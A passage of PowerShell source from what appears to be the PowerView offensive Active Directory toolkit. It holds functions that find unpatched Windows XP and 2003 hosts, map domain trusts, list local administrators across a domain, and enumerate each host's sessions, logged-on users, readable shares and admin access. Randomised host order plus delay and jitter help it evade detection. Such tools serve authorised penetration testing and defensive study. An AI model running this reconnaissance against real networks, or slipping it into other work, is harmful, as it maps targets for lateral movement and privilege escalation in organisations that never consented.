    $vulnXP = $servers | Where-Object {$_.OperatingSystem -match '.*XP.*' -and $_.ServicePack -notmatch '.*3.*'}
    
    # find any windows 2003 SP1 boxes
    $vuln2003 = $servers | Where-Object {$_.OperatingSystem -match '.*2003.*' -and $_.ServicePack -match '.*1.*'}
    
    
    if ($FullData){
        if($Ping){
            if ($vuln2000) { $vuln2000 | Where-Object { Test-Server -Server $_.HostName } }
            if ($vulnXP) { $vulnXP | Where-Object { Test-Server -Server $_.HostName } }
            if ($vuln2003) { $vuln2003 | Where-Object { Test-Server -Server $_.HostName } }
        }
        else{
            $vuln2000 
            $vulnXP
            $vuln2003
        }
    }
    else{
        if($Ping){
            if($vuln2000) { $vuln2000 | Where-Object {Test-Server -Server $_.HostName} | ForEach-Object {$_.HostName} }
            if($vulnXP) { $vulnXP | Where-Object {Test-Server -Server $_.HostName} | ForEach-Object {$_.HostName} }
            if($vuln2003) { $vuln2003 | Where-Object {Test-Server -Server $_.HostName} | ForEach-Object {$_.HostName} }
        }
        else {
            $vuln2000 | ForEach-Object {$_.HostName}
            $vulnXP | ForEach-Object {$_.HostName}
            $vuln2003 | ForEach-Object {$_.HostName}
        }
    }
}


function Invoke-FindUserTrustGroups {
    <#
        .SYNOPSIS
        Enumerates users who are in groups outside of their
        principal domain.
        
        .DESCRIPTION
        This function queries the domain for all users objects,
        extract the memberof groups for each users, and compares
        found memberships to the user's current domain.
        Any group memberships outside of the current domain
        are output.

        .PARAMETER UserName
        Username to filter results for, wilfcards accepted.

        .PARAMETER Domain
        Domain to query for users.

        .LINK
        http://blog.harmj0y.net/
    #>

    [CmdletBinding()]
    param(
        [string]
        $UserName,

        [string]
        $Domain
    )

    if ($Domain){
        # check if we're filtering for a specific user
        if($UserName){
            $users = Get-NetUsers -Domain $Domain -UserName $UserName
        }
        else{
            $users = Get-NetUsers -Domain $Domain
        }
        # get the domain name into distinguished form
        $DistinguishedDomainName = "DC=" + $Domain -replace '\.',',DC='
    }
    else {
        # check if we're filtering for a specific user
        if($UserName){
            $users = Get-NetUsers -UserName $UserName
        }
        else{
            $users = Get-NetUsers
        }
        $DistinguishedDomainName = [string] ([adsi]'').distinguishedname
        $Domain = $DistinguishedDomainName -replace 'DC=','' -replace ',','.'
    }

    # check "memberof" for each user
    foreach ($user in $users){

        # get this user's memberships
        $memberships = $user.memberof

        foreach ($membership in $memberships){
            if($membership){
                # extract out just domain containers
                $index = $membership.IndexOf("DC=")
                if($index){
                    $DomainMembership = $membership.substring($index)
                    # if this domain membership isn't the users's pricipal domain, output it
                    if($DomainMembership -ne $DistinguishedDomainName){
                        $out = new-object psobject 
                        $out | add-member Noteproperty 'Domain' $Domain
                        $out | add-member Noteproperty 'User' $user.samaccountname[0]
                        $out | add-member Noteproperty 'GroupMembership' $membership
                        $out
                    }
                }
                
            }
        }
    }
}


function Invoke-MapDomainTrusts {
    <#
        .SYNOPSIS
        Try to map all transitive domain trust relationships.
        
        .DESCRIPTION
        This function gets all trusts for the current domain,
        and tries to get all trusts for each domain it finds.

        .EXAMPLE
        > Invoke-MapDomainTrusts
        Return a "domain1,domain2,trustType,trustDirection" list

        .LINK
        http://blog.harmj0y.net/
    #>

    # keep track of domains seen so we don't hit infinite recursion
    $seenDomains = @{}

    # our domain status tracker
    $domains = New-Object System.Collections.Stack

    # get the current domain and push it onto the stack
    $currentDomain = (([adsi]'').distinguishedname -replace 'DC=','' -replace ',','.')[0]
    $domains.push($currentDomain)

    while($domains.Count -ne 0){

        $d = $domains.Pop()

        # if we haven't seen this domain before
        if (-not $seenDomains.ContainsKey($d)) {

            # mark it as seen in our list
            $seenDomains.add($d, "") | out-null

            try{
                # get all the trusts for this domain
                $trusts = Get-NetDomainTrusts -Domain $d
                if ($trusts){

                    # enumerate each trust found
                    foreach ($trust in $trusts){
                        $source = $trust.SourceName
                        $target = $trust.TargetName
                        $type = $trust.TrustType
                        $direction = $trust.TrustDirection

                        # make sure we process the target
                        $domains.push($target) | out-null

                        # build the nicely-parsable custom output object
                        $out = new-object psobject 
                        $out | add-member Noteproperty 'SourceDomain' $source
                        $out | add-member Noteproperty 'TargetDomain' $target
                        $out | add-member Noteproperty 'TrustType' $type
                        $out | add-member Noteproperty 'TrustDirection' $direction
                        $out
                    }
                }
            }
            catch{
                Write-Warning "[!] Error: $_"
            }
        }
    }
}


function Invoke-FindAllUserTrustGroups {
    <#
        .SYNOPSIS
        Try to map all transitive domain trust relationships and
        enumerates all users who are in groups outside of their
        principal domain.
        
        .DESCRIPTION
        This function tries to map all domain trusts, and then
        queries the domain for all users objects, extracting the 
        memberof groups for each users, and compares
        found memberships to the user's current domain.
        Any group memberships outside of the current domain
        are output.

        .PARAMETER UserName
        Username to filter results for, wilfcards accepted.

        .LINK
        http://blog.harmj0y.net/
    #>

    [CmdletBinding()]
    param(
        [string]
        $UserName
    )

    # keep track of domains seen so we don't hit infinite recursion
    $seenDomains = @{}

    # our domain status tracker
    $domains = New-Object System.Collections.Stack

    # get the current domain and push it onto the stack
    $currentDomain = (([adsi]'').distinguishedname -replace 'DC=','' -replace ',','.')[0]
    $domains.push($currentDomain)

    while($domains.Count -ne 0){

        $d = $domains.Pop()

        # if we haven't seen this domain before
        if (-not $seenDomains.ContainsKey($d)) {

            # mark it as seen in our list
            $seenDomains.add($d, "") | out-null

            # get the trust groups for this domain
            if ($UserName){
                Invoke-FindUserTrustGroups -Domain $d -UserName $UserName

            }
            else{
                Invoke-FindUserTrustGroups -Domain $d                
            }

            try{
                # get all the trusts for this domain
                $trusts = Get-NetDomainTrusts -Domain $d
                if ($trusts){

                    # enumerate each trust found
                    foreach ($trust in $trusts){
                        $source = $trust.SourceName
                        $target = $trust.TargetName
                        $type = $trust.TrustType
                        $direction = $trust.TrustDirection

                        # make sure we process the target
                        $domains.push($target) | out-null
                    }
                }
            }
            catch{
                Write-Warning "[!] Error: $_"
            }
        }
    }
}


function Invoke-EnumerateLocalAdmins {
    <#
        .SYNOPSIS
        Enumerates members of the local Administrators groups
        across all machines in the domain.
        
        .DESCRIPTION
        This function queries the domain for all active machines with 
        Get-NetComputers, then for each server it queries the local
        Administrators with Get-NetLocalGroup.

        .PARAMETER HostList
        List of hostnames/IPs to search.

        .PARAMETER HostFilter
        Host filter name to query AD for, wildcards accepted.

        .PARAMETER Delay
        Delay between enumerating hosts, defaults to 0.

        .PARAMETER Ping
        Ping each host to ensure it's up before enumerating.
        
        .PARAMETER NoPing
        Don't ping each host to ensure it's up before enumerating.
        
        .PARAMETER Jitter
        Jitter for the host delay, defaults to +/- 0.3.

        .PARAMETER OutFile
        Output results to a specified csv output file.

        .PARAMETER Domain
        Domain to query for systems.

        .LINK
        http://blog.harmj0y.net/
    #>
    
    [CmdletBinding()]
    param(
        [string]
        $HostList,

        [string]
        $HostFilter,

        [Switch]
        $Ping,
        
        [Switch]
        $NoPing,
        
        [UInt32]
        $Delay = 0,
        
        [double]
        $Jitter = .3,
        
        [string]
        $OutFile,
        
        [string]
        $Domain
    )
    
    If ($PSBoundParameters['Debug']) {
        $DebugPreference = 'Continue'
    }
    
    # get the target domain
    if($Domain){
        $targetDomain = $Domain
    }
    else{
        # use the local domain
        $targetDomain = Get-NetDomain
    }
    
    Write-Verbose "[*] Running Invoke-EnumerateLocalAdmins on domain $targetDomain with delay of $Delay"
    
    # get the current user
    $CurrentUser = Get-NetCurrentUser
    
    # random object for delay
    $randNo = New-Object System.Random
    
    # if we're using a host list, read the targets in and add them to the target list
    if($HostList){
        $servers = @()
        if (Test-Path -Path $HostList){
            $servers = Get-Content -Path $HostList
        }
        else {
            Write-Warning "`r`n[!] Input file '$HostList' doesn't exist!`r`n"
            return $null
        }
    }
    else{
        # otherwise, query the domain for target servers
        "[*] Querying domain for hosts...`r`n"
        # get just the name so we can get the account enabled/disabled property
        $servers = Get-NetComputers -FullData -Domain $targetDomain | ForEach-Object {$_.name}
    }
    
    # randomize the server list
    $servers = Get-ShuffledArray $servers
    
    # delete any existing output file if it already exists
    If ($OutFile -and (Test-Path -Path $OutFile)){ Remove-Item -Path $OutFile }
    
    if (($servers -eq $null) -or ($servers.Count -eq 0)){
        Write-Warning "`r`n[!] No hosts found!"
        return $null
    }
    else{
        
        $counter = 0
        
        foreach ($server in $servers){
            
            $counter = $counter + 1
            
            Write-Verbose "[*] Enumerating server $server ($counter of $($servers.count))"
            
            # sleep for our semi-randomized interval
            Start-Sleep -Seconds $randNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
            
            $up = $true
            if(-not $NoPing){
                $up = Test-Server -Server $server
            }
            if($up){
                # grab the users for the local admins on this server
                $users = Get-NetLocalGroup -HostName $server
                if($users -and ($users.Length -ne 0)){
                    # output the results to a csv if specified
                    if($OutFile){
                        $users | export-csv -Append -notypeinformation -path $OutFile
                    }
                    else{
                        # otherwise return the user objects
                        $users
                    }
                }
                else{
                    Write-Verbose "[!] No users returned from $server"
                }
            }
            
        }
    }
    
}


function Invoke-EnumerateLocalAdminsThreaded {
    <#
        .SYNOPSIS
        Enumerates members of the local Administrators groups
        across all machines in the domain.
        
        .DESCRIPTION
        This function queries the domain for all active machines with 
        Get-NetComputers, then for each server it queries the local
        Administrators with Get-NetLocalGroup.

        .PARAMETER HostList
        List of hostnames/IPs to search.
      
        .PARAMETER HostFilter
        Host filter name to query AD for, wildcards accepted.

        .PARAMETER NoPing
        Don't ping each host to ensure it's up before enumerating.

        .PARAMETER Domain
        Domain to query for systems.

        .PARAMETER MaxThreads
        The maximum concurrent threads to execute.

        .LINK
        http://blog.harmj0y.net/
    #>
    
    [CmdletBinding()]
    param(
        [string]
        $HostList,

        [string]
        $HostFilter,

        [Switch]
        $NoPing,
        
        [string]
        $Domain,

        [Int]
        $MaxThreads = 10
    )
    
    If ($PSBoundParameters['Debug']) {
        $DebugPreference = 'Continue'
    }
    
    # get the target domain
    if($Domain){
        $targetDomain = $Domain
    }
    else{
        # use the local domain
        $targetDomain = Get-NetDomain
    }
    
    Write-Verbose "[*] Running Invoke-EnumerateLocalAdminsThreaded on domain $targetDomain"
    
    # get the current user
    $CurrentUser = Get-NetCurrentUser
    
    # if we're using a host list, read the targets in and add them to the target list
    if($HostList){
        $servers = @()
        if (Test-Path -Path $HostList){
            $servers = Get-Content -Path $HostList
        }
        else {
            Write-Warning "`r`n[!] Input file '$HostList' doesn't exist!`r`n"
            return $null
        }
    }
    else{
        # otherwise, query the domain for target servers
        if($HostFilter){
            Write-Verbose "[*] Querying domain $targetDomain for hosts with filter '$HostFilter'`r`n"
            $servers = Get-NetComputers -Domain $targetDomain -HostName $HostFilter
        }
        else {
            Write-Verbose "[*] Querying domain $targetDomain for hosts...`r`n"
            $servers = Get-NetComputers -Domain $targetDomain
        }
    }
    
    # randomize the server list
    $servers = Get-ShuffledArray $servers
    
    if (($servers -eq $null) -or ($servers.Count -eq 0)){
        Write-Warning "`r`n[!] No hosts found!"
        return $null
    }

    # script block that eunmerates a server
    # this is called by the multi-threading code later
    $EnumServerBlock ={
        param($Server, $Ping)

        # optionally check if the server is up first
        $up = $true
        if($Ping){
            $up = Test-Server -Server $Server
        }
        if($up){
            # grab the users for the local admins on this server
            $users = Get-NetLocalGroup -HostName $server
            if($users -and ($users.Length -ne 0)){
                $users
            }
            else{
                Write-Verbose "[!] No users returned from $server"
            }
        }
    }

    # Adapted from:
    #   http://powershell.org/wp/forums/topic/invpke-parallel-need-help-to-clone-the-current-runspace/
    $sessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
    $sessionState.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()
 
    # grab all the current variables for this runspace
    $MyVars = Get-Variable -Scope 1
 
    # these Variables are added by Runspace.Open() Method and produce Stop errors if you add them twice
    $VorbiddenVars = @("?","args","ConsoleFileName","Error","ExecutionContext","false","HOME","Host","input","InputObject","MaximumAliasCount","MaximumDriveCount","MaximumErrorCount","MaximumFunctionCount","MaximumHistoryCount","MaximumVariableCount","MyInvocation","null","PID","PSBoundParameters","PSCommandPath","PSCulture","PSDefaultParameterValues","PSHOME","PSScriptRoot","PSUICulture","PSVersionTable","PWD","ShellId","SynchronizedHash","true")
 
    # Add Variables from Parent Scope (current runspace) into the InitialSessionState 
    ForEach($Var in $MyVars) {
        If($VorbiddenVars -notcontains $Var.Name) {
        $sessionstate.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
        }
    }

    # Add Functions from current runspace to the InitialSessionState
    ForEach($Function in (Get-ChildItem Function:)) {
        $sessionState.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Function.Name, $Function.Definition))
    }
 
    # threading adapted from
    # https://github.com/darkoperator/Posh-SecMod/blob/master/Discovery/Discovery.psm1#L407
    # Thanks Carlos!   
    $counter = 0

    # create a pool of maxThread runspaces   
    $pool = [runspacefactory]::CreateRunspacePool(1, $MaxThreads, $sessionState, $host)
    $pool.Open()

    $jobs = @()   
    $ps = @()   
    $wait = @()

    foreach ($server in $servers){
        # make sure we get a server name
        if ($server -ne ''){
            Write-Verbose "[*] Enumerating server $server ($counter of $($servers.count))"

            While ($($pool.GetAvailableRunspaces()) -le 0) {
                Start-Sleep -milliseconds 500
            }
    
            # create a "powershell pipeline runner"   
            $ps += [powershell]::create()
   
            $ps[$counter].runspacepool = $pool

            # add the script block + arguments
            [void]$ps[$counter].AddScript($EnumServerBlock).AddParameter('Server', $server).AddParameter('Ping', -not $NoPing)
    
            # start job
            $jobs += $ps[$counter].BeginInvoke();
     
            # store wait handles for WaitForAll call   
            $wait += $jobs[$counter].AsyncWaitHandle
        }
        $counter = $counter + 1
    }

    Write-Verbose "Waiting for scanning threads to finish..."

    $waitTimeout = Get-Date

    while ($($jobs | ? {$_.IsCompleted -eq $false}).count -gt 0 -or $($($(Get-Date) - $waitTimeout).totalSeconds) -gt 60) {
            Start-Sleep -milliseconds 500
        } 

    # end async call   
    for ($y = 0; $y -lt $counter; $y++) {     

        try {   
            # complete async job   
            $ps[$y].EndInvoke($jobs[$y])   

        } catch {
            Write-Warning "error: $_"  
        }
        finally {
            $ps[$y].Dispose()
        }    
    }
    $pool.Dispose()
}


function Invoke-HostEnum {
    <#
        .SYNOPSIS
        Runs all available enumeration methods on a given host.

        .DESCRIPTION
        This function runs all available functions on a given host,
        including querying AD for host information, finding active
        sessions on a host, logged on users, available shares, whether
        the current user has local admin access, the local groups,
        local administrators, and local services on the target.

        .PARAMETER HostName
        The hostname to enumerate.

        .EXAMPLE
        > Invoke-HostEnum WINDOWSXP
        Runs all enumeration methods on the WINDOWSXP host
    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $True)]
        [string]
        $HostName
    )
    
    If ($PSBoundParameters['Debug']) {
        $DebugPreference = 'Continue'
    }
    
    "[+] Invoke-HostEnum Report: $HostName"
    
    # Step 1: get any AD data associated with this server
    $adinfo = Get-NetComputers -Hostname "$HostName*" -FullData | Out-String
    "`n[+] AD query for: $HostName"
     $adinfo.Trim()
    
    # Step 2: get active sessions for this host and display what we find
    $sessions = Get-NetSessions -HostName $HostName
    if ($sessions -and ($sessions.Count -ne 0)){
        "`n[+] Active sessions for $HostName :"
    }
    foreach ($session in $sessions) {
        $username = $session.sesi10_username
        $cname = $session.sesi10_cname
        $activetime = $session.sesi10_time
        $idletime = $session.sesi10_idle_time
        # make sure we have a result
        if (($username -ne $null) -and ($username.trim() -ne '')){
            "[+] $HostName - Session - $username from $cname - Active: $activetime - Idle: $idletime"
        }
    }
    
    # Step 3: get any logged on users for this host and display what we find
    $users = Get-NetLoggedon -HostName $HostName
    if ($users -and ($users.Count -ne 0)){
        "`n[+] Users logged onto $HostName :"
    }
    foreach ($user in $users) {
        $username = $user.wkui1_username
        $domain = $user.wkui1_logon_domain
        
        if ($username -ne $null){
            # filter out $ machine accounts
            if ( !$username.EndsWith("$") ) {
                "[+] $HostName - Logged-on - $domain\\$username"
            }
        }
    }
    
    # step 4: see if we can get the last loggedon user by remote registry
    $lastUser = Get-LastLoggedOn -HostName $HostName
    if ($lastUser){
        "`n[+] Last user logged onto $HostName : $lastUser"
    }
    
    # Step 5: get the shares for this host and display what we find
    $shares = Get-NetShare -HostName $HostName
    if ($shares -and ($shares.Count -ne 0)){
        "`n[+] Shares on $HostName :"
    }
    foreach ($share in $shares) {
        if ($share -ne $null){
            $netname = $share.shi1_netname
            $remark = $share.shi1_remark
            $path = '\\'+$HostName+'\'+$netname
            
            if (($netname) -and ($netname.trim() -ne '')){
                
                "[+] $HostName - Share: $netname `t: $remark"
                try{
                    # check for read access to this share
                    $f=[IO.Directory]::GetFiles($path)
                    "[+] $HostName - Read Access - Share: $netname `t: $remark"
                }
                catch {}
            }
        }
    }
    
    # Step 6: Check if current user has local admin access
    $access = Invoke-CheckLocalAdminAccess -Hostname $HostName
    if ($access){
        "`n[+] Current user has local admin access to $HostName !"
    }
    
    # Step 7: Get all the local groups
    $localGroups = Get-NetLocalGroups -Hostname $HostName | Format-List | Out-String
    if ($localGroups -and $localGroups.Length -ne 0){
        "`n[+] Local groups for $HostName :"
        $localGroups.Trim()
    }
    else {
        "[!] Unable to retrieve localgroups for $HostName"
    }
    
    # Step 8: Get any local admins
    $localAdmins = Get-NetLocalGroup -Hostname $HostName | Format-List | Out-String
    if ($localAdmins -and $localAdmins.Length -ne 0){
        "`n[+] Local Administrators for $HostName :"
        $localAdmins.Trim()
    }
    else {
        "[!] Unable to retrieve local Administrators for $HostName"
    }
    
    # Step 9: Get any local services
    $localServices = Get-NetLocalServices -Hostname $HostName | Format-List | Out-String
    if ($localServices -and $localServices.Length -ne 0){
        "`n[+] Local services for $HostName :"
        $localServices.Trim()
    }
    else {
        "[!] Unable to retrieve local services for $HostName"
    }
}

$Mod = New-InMemoryModule -ModuleName Win32

# all of the Win32 API functions we need
$FunctionDefinitions = @(
    (func netapi32 NetShareEnum ([Int]) @([string], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetWkstaUserEnum ([Int]) @([string], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetSessionEnum ([Int]) @([string], [string], [string], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),    
    (func netapi32 NetFileEnum ([Int]) @([string], [string], [string], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetConnectionEnum ([Int]) @([string], [string], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetApiBufferFree ([Int]) @([IntPtr])),
    (func advapi32 OpenSCManagerW ([IntPtr]) @([string], [string], [Int])),
    (func advapi32 CloseServiceHandle ([Int]) @([IntPtr])),
    (func kernel32 GetLastError ([Int]) @())
)

# the NetShareEnum result structure
$SHARE_INFO_1 = struct $Mod SHARE_INFO_1 @{
    shi1_netname = field 0 String -MarshalAs @('LPWStr')
    shi1_type = field 1 UInt32
    shi1_remark = field 2 String -MarshalAs @('LPWStr')
}

# the NetWkstaUserEnum result structure
$WKSTA_USER_INFO_1 = struct $Mod WKSTA_USER_INFO_1 @{
    wkui1_username = field 0 String -MarshalAs @('LPWStr')
    wkui1_logon_domain = field 1 String -MarshalAs @('LPWStr')
    wkui1_oth_domains = field 2 String -MarshalAs @('LPWStr')
    wkui1_logon_server = field 3 String -MarshalAs @('LPWStr')
}

# the NetSessionEnum result structure
$SESSION_INFO_10 = struct $Mod SESSION_INFO_10 @{
    sesi10_cname = field 0 String -MarshalAs @('LPWStr')
    sesi10_username = field 1 String -MarshalAs @('LPWStr')
    sesi10_time = field 2 UInt32
    sesi10_idle_time = field 3 UInt32
}

# the NetFileEnum result structure
$FILE_INFO_3 = struct $Mod FILE_INFO_3 @{
    fi3_id = field 0 UInt32
    fi3_permissions = field 1 UInt32
    fi3_num_locks = field 2 UInt32
    fi3_pathname = field 3 String -MarshalAs @('LPWStr')
    fi3_username = field 4 String -MarshalAs @('LPWStr')
}

# the NetConnectionEnum result structure
$CONNECTION_INFO_1 = struct $Mod CONNECTION_INFO_1 @{
    coni1_id = field 0 UInt32
    coni1_type = field 1 UInt32
    coni1_num_opens = field 2 UInt32
    coni1_num_users = field 3 UInt32
    coni1_time = field 4 UInt32
    coni1_username = field 5 String -MarshalAs @('LPWStr')
    coni1_netname = field 6 String -MarshalAs @('LPWStr')
}

$Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
$Netapi32 = $Types['netapi32']
$Advapi32 = $Types['advapi32']
$Kernel32 = $Types['kernel32']
